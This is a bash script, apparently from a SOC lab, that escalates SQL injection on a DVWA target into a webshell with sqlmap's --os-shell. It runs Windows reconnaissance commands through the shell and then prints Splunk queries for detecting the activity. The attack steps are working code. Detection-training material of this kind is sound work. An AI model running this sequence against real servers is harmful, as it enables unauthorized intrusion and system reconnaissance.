#!/bin/bash
#==============================================================================
# SOC Lab — SQL Injection Simulation
# Phase 5: Webshell + OS Command Execution
# MITRE ATT&CK: T1505.003 (Server Software Component: Web Shell)
#             + T1059.003 (Command and Scripting Interpreter: Windows CMD)
#             + T1105    (Ingress Tool Transfer)
#
# Target  : http://10.10.10.10/DVWA/vulnerabilities/sqli/
# Source  : 10.10.10.5 (Kali)
#
# This phase attempts to escalate from SQL injection to OS command execution
# via sqlmap's --os-shell capability. If successful, executes a sequence of
# Windows reconnaissance commands to generate Sysmon EID 1 events showing
# httpd.exe -> cmd.exe parent-child relationships.
#
# Usage:
#   ./phase5_webshell.sh "PHPSESSID=<your_session_id>"
#==============================================================================

set -u

if [[ $# -lt 1 ]]; then
    echo "ERROR: PHPSESSID cookie required"
    echo "Usage: $0 \"PHPSESSID=<your_session_id>\""
    exit 1
fi

PHPSESSID_VALUE="$1"
PHPSESSID_VALUE="${PHPSESSID_VALUE#PHPSESSID=}"

TARGET_IP="10.10.10.10"
TARGET_URL="http://${TARGET_IP}/DVWA/vulnerabilities/sqli/?id=1&Submit=Submit"
COOKIE="PHPSESSID=${PHPSESSID_VALUE}; security=low"
OUTDIR="${HOME}/sqli_sim"
LOGFILE="${OUTDIR}/phase5.log"
SQLMAP_DIR="${OUTDIR}/sqlmap_output"

mkdir -p "${OUTDIR}"

log() { echo "$@" | tee -a "${LOGFILE}"; }

banner() {
    log ""
    log "=============================================================="
    log " $1"
    log "=============================================================="
}

# --- Pre-flight ---
banner "PHASE 5 - WEBSHELL + OS EXECUTION  |  MITRE T1505.003 + T1059.003"
log "Start time : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log "Target     : ${TARGET_URL}"
log "Session ID : ${PHPSESSID_VALUE:0:8}..."

log ""
log "[*] Pre-flight: validating session cookie..."
PREFLIGHT_CODE=$(curl -s -b "${COOKIE}" -o /dev/null -w "%{http_code}" --max-time 5 "${TARGET_URL}")
if [[ "${PREFLIGHT_CODE}" != "200" ]]; then
    log "ERROR: pre-flight got HTTP ${PREFLIGHT_CODE} — refresh cookie"
    exit 1
fi
log "[+] Session valid — beginning webshell attempt"

# --- Step 1: Attempt OS shell via SQLi ---
# --os-shell will:
#   1. Use the injection point we already discovered
#   2. Attempt to write a PHP script to the web root using INTO OUTFILE
#   3. Provide an interactive shell prompt
#
# Key flags:
#   --batch         : never prompt — pick safe defaults
#   --os-shell      : the goal
#   --web-root      : tell sqlmap where Apache serves from (XAMPP default)
#   --tmp-path      : Windows tmp folder for staging files
#   --random-agent  : DO NOT use — we want sqlmap UA visible for detection
#
# Note: --os-shell is INTERACTIVE — sqlmap will hand us a shell once it works.
# To make this scriptable, we pipe a sequence of commands followed by 'exit'
# into sqlmap's stdin. Each command becomes a Sysmon EID 1 event.

banner "Step 1 — Attempting webshell deployment via --os-shell"
log "Start (UTC): $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"
log ""
log "Commands queued for OS execution (each → 1 Sysmon EID 1 event):"
log "  whoami                       # T1033 - System owner discovery"
log "  hostname                     # T1082 - System info discovery"
log "  ipconfig                     # T1016 - System network config"
log "  systeminfo                   # T1082 - System info (verbose)"
log "  net user                     # T1087.001 - Local account discovery"
log "  tasklist                     # T1057 - Process discovery"
log "  exit"
log ""

# Queue commands via heredoc piped to sqlmap stdin
# Each line becomes a separate OS command if --os-shell succeeded
sqlmap \
    -u "${TARGET_URL}" \
    --cookie="${COOKIE}" \
    --batch \
    --os-shell \
    --web-root="C:/xampp/htdocs/dvwa/" \
    --tmp-path="C:/Windows/Temp/" \
    --output-dir="${SQLMAP_DIR}" \
    2>&1 <<'EOF' | tee -a "${LOGFILE}"
whoami
hostname
ipconfig
systeminfo
net user
tasklist
exit
EOF

log ""
log "End (UTC): $(date -u +%Y-%m-%dT%H:%M:%S.%3NZ)"

# --- Summary ---
banner "PHASE 5 COMPLETE"
log "End time : $(date -u +%Y-%m-%dT%H:%M:%SZ)"
log ""
log "What to check in Splunk:"
log ""
log "  # 1. Webshell file creation (T1505.003)"
log '    index=sysmon EventCode=11 (Image="*httpd.exe" OR Image="*php*")'
log '      TargetFilename="*.php" earliest=-15m'
log '    | table _time Image TargetFilename ProcessGuid'
log ""
log "  # 2. Webshell ACCESS in Apache logs"
log '    index=main sourcetype=access_combined clientip=10.10.10.5'
log '      uri_path!="*/vulnerabilities/sqli/*" uri_path="*.php"'
log '      earliest=-15m'
log '    | table _time uri_path uri_query status bytes'
log ""
log "  # 3. THE SMOKING GUN: Apache spawning cmd.exe (T1059.003)"
log '    index=sysmon EventCode=1 ParentImage="*httpd.exe" earliest=-15m'
log '    | table _time ParentImage Image CommandLine User'
log ""
log "  # 4. Reconnaissance commands executed"
log '    index=sysmon EventCode=1 earliest=-15m'
log '      (CommandLine="*whoami*" OR CommandLine="*ipconfig*"'
log '       OR CommandLine="*systeminfo*" OR CommandLine="*tasklist*"'
log '       OR CommandLine="*net*user*")'
log '    | table _time User ParentImage Image CommandLine'
log ""
log "If --os-shell FAILED: that itself is a finding (defense in depth working)"
log "If --os-shell SUCCEEDED: Sysmon EID 1 events are the strongest detection signal"
